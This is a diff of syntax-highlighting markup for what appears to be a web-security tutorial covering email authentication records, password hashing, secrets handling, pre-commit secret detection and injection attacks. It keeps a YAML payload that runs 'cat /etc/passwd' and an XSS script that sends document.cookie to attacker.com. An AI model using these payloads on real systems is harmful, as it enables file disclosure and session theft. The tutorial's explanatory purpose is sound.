-&lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'cat&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;/etc/passwd'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
+&lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'cat&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;/etc/passwd'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;And execute this Python code:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;  &lt;span class="c1"&gt;# pip install pyyaml is required&lt;/span&gt;
@@ -677,7 +677,7 @@ lost devices. You need a Lost Device Policy. This can include:&lt;/p&gt;
 
 &lt;span class="nd"&gt;@contextlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contextmanager&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="sd"&gt;"""Temporarily limit a resource."""&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""Temporarily limit a resource."""&lt;/span&gt;
     &lt;span class="n"&gt;soft_limit&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hard_limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getrlimit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;resource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setrlimit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resource_type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hard_limit&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;# set soft limit&lt;/span&gt;
     &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -864,7 +864,7 @@ examples are Wikipedia, Reddit, and StackExchange.&lt;/p&gt;
 that connects users with groups:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Image by author" src="https://cdn-images-1.medium.com/max/2000/1*XT6bjGvqQR9DNciLRlUXFA.png"/&gt;&lt;em&gt;Image by author&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;Then you need to get all roles a user has:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;role_id&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;role_user&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;user_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;current_user&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;role_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;role_user&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;current_user&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;You might want to cache this query as you will execute it a lot and the roles
 might not change that quickly.&lt;/p&gt;
@@ -902,7 +902,7 @@ error responses, and not repeat code. A good compromise could be this pattern:&l
 
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_article&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="sd"&gt;"""&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""&lt;/span&gt;
 &lt;span class="sd"&gt;    Make the variable "article" available.&lt;/span&gt;
 
 &lt;span class="sd"&gt;    Parameters&lt;/span&gt;
@@ -1306,8 +1306,8 @@ anything. But when the tool complains, it is important.&lt;/p&gt;
   problematic for newsletters but represents also what users expect.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;As a domain owner, you can validate your SPF record like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ dig google.com txt &lt;span class="p"&gt;|&lt;/span&gt; grep spf
-google.com.  &lt;span class="m"&gt;3600&lt;/span&gt; IN TXT &lt;span class="s2"&gt;"v=spf1 include:_spf.google.com ~all"&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;dig&lt;span class="w"&gt; &lt;/span&gt;google.com&lt;span class="w"&gt; &lt;/span&gt;txt&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;grep&lt;span class="w"&gt; &lt;/span&gt;spf
+google.com.&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="m"&gt;3600&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IN&lt;span class="w"&gt; &lt;/span&gt;TXT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"v=spf1 include:_spf.google.com ~all"&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;To verify DKIM, look in an email you received for this:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=medium.com; \
@@ -1327,8 +1327,8 @@ b=EL3HbaL iSgAJsE6LO8L10T52+rYyump4R1aMAV9nCwyXLENaxbS0xgZvksgoplu8Rjo/wWV J0jDE
 &lt;li&gt;&lt;code&gt;bh&lt;/code&gt;: The hash of the body of the email.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;You can look up your DMARC record like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ dig _dmarc.google.com txt &lt;span class="p"&gt;|&lt;/span&gt; grep DMARC
-_dmarc.google.com. &lt;span class="m"&gt;290&lt;/span&gt; IN TXT &lt;span class="s2"&gt;"v=DMARC1; p=reject; \&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;dig&lt;span class="w"&gt; &lt;/span&gt;_dmarc.google.com&lt;span class="w"&gt; &lt;/span&gt;txt&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;grep&lt;span class="w"&gt; &lt;/span&gt;DMARC
+_dmarc.google.com.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;290&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IN&lt;span class="w"&gt; &lt;/span&gt;TXT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"v=DMARC1; p=reject; \&lt;/span&gt;
 &lt;span class="s2"&gt;    rua=[mailauth-reports@google.com](mailto:mailauth-reports@google.com)"&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;The record is structured in tag=value pairs which are separated by &lt;code&gt;;&lt;/code&gt; (&lt;a href="https://dmarc.org/overview/"&gt;source&lt;/a&gt;):&lt;/p&gt;
@@ -1426,7 +1426,7 @@ _dmarc.google.com. &lt;span class="m"&gt;290&lt;/span&gt; IN TXT &lt;span class=
 
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_extracted_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="sd"&gt;"""Get the extracted size in bytes."""&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""Get the extracted size in bytes."""&lt;/span&gt;
     &lt;span class="n"&gt;zp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zipfile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ZipFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;zinfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file_size&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;zinfo&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;zp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filelist&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -1542,15 +1542,15 @@ you two functions:&lt;/p&gt;
     &lt;span class="o"&gt;...&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;As an example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;werkzeug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;security&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;generate_password_hash&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;gen_key&lt;/span&gt;
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;gen_key&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;"foobar"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;"pbkdf2:sha512:1000"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; **from** werkzeug.security **import** generate_password_hash as gen_key
+&amp;gt;&amp;gt;&amp;gt; key = **gen_key**("foobar", "pbkdf2:sha512:1000", salt_length=8)
 
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt;
-&lt;span class="s1"&gt;'pbkdf2:sha512:1000**$**qc8Q9uqK**$**4f28daacb10dea6667e00c866607073b7a740817e8c4a267c1cedd05cf36cbdf609b14cf446d73d76819f37a3e0475160d444a4fab39526e72aca611960e4c77'&lt;/span&gt;
+&amp;gt;&amp;gt;&amp;gt; key
+'pbkdf2:sha512:1000**$**qc8Q9uqK**$**4f28daacb10dea6667e00c866607073b7a740817e8c4a267c1cedd05cf36cbdf609b14cf446d73d76819f37a3e0475160d444a4fab39526e72aca611960e4c77'
 
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;werkzeug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;security&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;check_password_hash&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;check_key&lt;/span&gt;
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;check_key&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;"foobar"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="k"&gt;True&lt;/span&gt;
+&amp;gt;&amp;gt;&amp;gt; **from** werkzeug.security **import** check_password_hash as check_key
+&amp;gt;&amp;gt;&amp;gt; **check_key**(key, "foobar")
+True
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;You can see that the first part of the method contains all the parameters necessary for the method. This means it is easy to extend. The second part (delimited by the Dollar symbol) is the 8 characters of the salt. Then comes the password which is hashed with the given method and salt.&lt;/p&gt;
 &lt;p&gt;There are other key derivate functions. Most notably &lt;a href="https://en.wikipedia.org/wiki/Scrypt"&gt;scrypt&lt;/a&gt;, which was not only designed to be demanding to the CPU but also requires much memory. For Python, there is passlib which offers a lot of hashing functions and key derivation functions. However, it seems not too wide-spread (&lt;a href="https://github.com/pallets/werkzeug/issues/1917#issuecomment-710762497"&gt;source&lt;/a&gt;). Instead, you can create something similar on your own by using core Python functions such as &lt;a href="https://docs.python.org/3/library/hashlib.html#hashlib.scrypt"&gt;hashlib.scrypt&lt;/a&gt; . A noteworthy key derivation function is &lt;a href="https://en.wikipedia.org/wiki/Argon2"&gt;Argon2&lt;/a&gt;.&lt;/p&gt;
@@ -1648,8 +1648,8 @@ hijacking&lt;/strong&gt;.&lt;/p&gt;
 to posts. We assume that the comments are just taken as is and copied to
 everybody who opens the page. The comment we make is&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class="nx"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Image&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
-    &lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'[https://attacker.com/steal?cookie='&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;https&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//attacker.com/?'+document.cookie);&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Image&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'[https://attacker.com/steal?cookie='&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;https&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//attacker.com/?'+document.cookie);&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;You can see that this will not do anything &amp;mdash; for the other users, this will
@@ -1736,9 +1736,9 @@ layer (DAL) that takes care of the escaping.&lt;/p&gt;
 &lt;p&gt;Either don&amp;rsquo;t log environment variables at all or make REALLY sure that there are no secrets inside. You can also blacklist patterns as &lt;a href="undefined"&gt;Joe Crobak&lt;/a&gt; showed in his post &amp;ldquo;&lt;a href="https://medium.com/@joecrobak/seven-best-practices-for-keeping-sensitive-data-out-of-logs-3d7bbd12904"&gt;Seven Best Practices for Keeping Sensitive Data Out of Logs&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;
 &lt;h3 id="storing-secrets-locally-direnv"&gt;Storing Secrets Locally: Direnv&lt;/h3&gt;
 &lt;p&gt;&lt;a href="https://direnv.net/"&gt;direnv&lt;/a&gt; is a shell extension that makes your shell execute an .envrc file if you are in the folder or a subfolder. Such a file can look like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_ACCESS_KEY_ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;AKIAIOSFODNN7EXAMPLE
-&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_SECRET_ACCESS_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wJalrXUtnFEMI/K7MDENG/bPxRfYEXAMPLEKEY
-&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;AWS_DEFAULT_REGION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;us-west-2
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_ACCESS_KEY_ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;AKIAIOSFODNN7EXAMPLE
+&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_SECRET_ACCESS_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wJalrXUtnFEMI/K7MDENG/bPxRfYEXAMPLEKEY
+&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_DEFAULT_REGION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;us-west-2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Make sure the .envrc file is kept private by adding it to the .gitignore file.&lt;/p&gt;
 &lt;p&gt;Wherever people would have used their secrets in the code, they now can use the environment variable instead.&lt;/p&gt;
@@ -1747,17 +1747,17 @@ layer (DAL) that takes care of the escaping.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://pre-commit.com/"&gt;pre-commit&lt;/a&gt; is an application that helps you to apply git hooks. Those are executed before code is added to the git repository.&lt;/p&gt;
 &lt;p&gt;You can make sure that no AWS credentials or private keys are added to the repository by creating the following .pre-commit-config.yaml file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;https&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;//github.com/pre-commit/pre-commit-hooks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(https://github.com/pre-commit/pre-commit-hooks)&lt;/span&gt;
-    &lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v3.2.0&lt;/span&gt;
-    &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-aws-credentials&lt;/span&gt;
-    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-private-key&lt;/span&gt;
-&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;git@github.com:Yelp/detect-secrets&lt;/span&gt;
-    &lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v0.14.3&lt;/span&gt;
-    &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt;   &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-secrets&lt;/span&gt;
-        &lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'--baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'.secrets.baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
-        &lt;span class="nt"&gt;exclude&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;.*/tests/.*&lt;/span&gt;
+&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;https&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;//github.com/pre-commit/pre-commit-hooks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(https://github.com/pre-commit/pre-commit-hooks)&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;v3.2.0&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-aws-credentials&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-private-key&lt;/span&gt;
+&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;git@github.com:Yelp/detect-secrets&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;v0.14.3&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-secrets&lt;/span&gt;
